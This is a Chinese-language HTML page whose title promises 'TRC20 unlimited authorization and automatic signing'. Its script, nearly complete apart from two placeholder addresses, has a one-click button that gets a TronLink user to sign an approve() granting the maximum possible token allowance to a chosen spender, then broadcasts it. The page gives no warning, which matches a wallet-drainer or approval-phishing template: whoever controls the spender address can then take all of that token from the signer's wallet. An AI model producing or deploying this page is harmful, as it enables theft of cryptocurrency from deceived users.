<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRC20 无限授权和自动签名</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
</head>
<body>
    <h1>TRC20代币授权（自动跳转签名页面）</h1>
    <button id="authorizeBtn">一键授权并签名</button>

    <script>
        const trc20ContractAddress = '代币合约地址'; // 替换为你想授权的代币合约地址
        const spenderAddress = '目标地址'; // 替换为你要授权给的地址（接收者）
        const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // 最大授权值（无限）

        async function authorize() {
            if (typeof window.tronWeb === 'undefined') {
                alert("请先安装并链接TronLink钱包！");
                return;
            }

            try {
                // 构建交易数据
                const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
                    trc20ContractAddress,
                    'approve(address,uint256)',
                    {
                        feeLimit: 10000000,
                        callValue: 0
                    },
                    [
                        { type: 'address', value: spenderAddress },
                        { type: 'uint256', value: maxUint256 }
                    ]
                );

                // 使用tronLink请求签名并跳转到签名页面
                const signedTransaction = await tronWeb.trx.sign(transaction.transaction);

                // 发送交易
                const result = await tronWeb.trx.sendRawTransaction(signedTransaction);

                alert('授权成功！交易ID: ' + result.txid);
            } catch (error) {
                console.error('授权失败', error);
                alert('授权失败，请重试');
            }
        }

        document.getElementById('authorizeBtn').addEventListener('click', authorize);
    </script>
</body>
</html>
